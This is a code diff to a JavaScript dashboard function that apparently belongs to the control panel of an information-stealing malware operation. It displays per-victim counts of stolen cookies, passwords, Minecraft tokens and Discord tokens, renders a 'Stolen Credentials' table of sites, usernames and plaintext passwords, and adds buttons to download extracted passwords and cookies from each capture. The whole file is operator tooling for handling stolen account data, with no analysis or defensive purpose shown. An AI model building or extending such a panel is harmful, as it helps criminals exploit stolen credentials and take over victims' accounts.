@@ -223,25 +223,29 @@ async function loadInlineUploads(clientId, container) {
   const totalCookies = s.netscapeCookies + s.jsonCookies;
 
   let html = `
-    <div class="detail-grid">
-      <div class="detail-tile">
-        <div class="k" style="color:var(--green)">Cookies</div>
+    <div class="tiles" style="margin-bottom: 20px; grid-template-columns: repeat(4, 1fr);">
+      <div class="tile">
+        <div class="k">Cookies</div>
         <div class="v">${totalCookies}</div>
       </div>
-      <div class="detail-tile">
-        <div class="k" style="color:var(--red)">Passwords</div>
+      <div class="tile">
+        <div class="k">Passwords</div>
         <div class="v">${s.passwords}</div>
       </div>
-      <div class="detail-tile">
-        <div class="k" style="color:var(--accent)">Minecraft Tokens</div>
+      <div class="tile">
+        <div class="k">Minecraft Tokens</div>
         <div class="v">${s.mcTokens}</div>
+      </div>
+      <div class="tile">
+        <div class="k">Discord Tokens</div>
+        <div class="v">${s.discordTokens}</div>
       </div>
     </div>
   `;
 
   if (s.creds && s.creds.length > 0) {
     html += `
-      <div class="k" style="font-size:11px; margin-bottom:8px; color:var(--muted); font-weight:600;">STOLEN CREDENTIALS</div>
+      <div class="k" style="font-size:10px; margin-bottom:8px; font-weight:600; letter-spacing:.1em; text-transform:uppercase; color:var(--muted);">Stolen Credentials</div>
       <div class="pass-table-wrap">
         <table class="pass-table">
           <thead>
@@ -256,7 +260,7 @@ async function loadInlineUploads(clientId, container) {
               <tr>
                 <td>${esc(c.url)}</td>
                 <td>${esc(c.user)}</td>
-                <td style="color:var(--green)">${esc(c.pass)}</td>
+                <td>${esc(c.pass)}</td>
               </tr>
             `).join('')}
           </tbody>
@@ -264,12 +268,14 @@ async function loadInlineUploads(clientId, container) {
       </div>
     `;
   } else {
-    html += `<div class="note">No plaintext passwords found in this capture.</div>`;
+    html += `<div class="note" style="margin-top: 12px;">No plaintext passwords found in this capture.</div>`;
   }
 
   html += `
-    <div style="display:flex; justify-content:flex-end; margin-top:16px;">
-      <button class="primary mini" onclick="event.stopPropagation(); location.href='/api/uploads/${latest.id}/download'">Download ZIP</button>
+    <div style="display:flex; justify-content:flex-end; gap:10px; margin-top:20px;">
+      <button class="ghost mini" onclick="event.stopPropagation(); location.href='/api/uploads/${latest.id}/extract/passwords'">download passwords (.txt)</button>
+      <button class="ghost mini" onclick="event.stopPropagation(); location.href='/api/uploads/${latest.id}/extract/cookies'">download cookies (.txt)</button>
+      <button class="primary mini" onclick="event.stopPropagation(); location.href='/api/uploads/${latest.id}/download'">download original zip</button>
     </div>
   `;
 
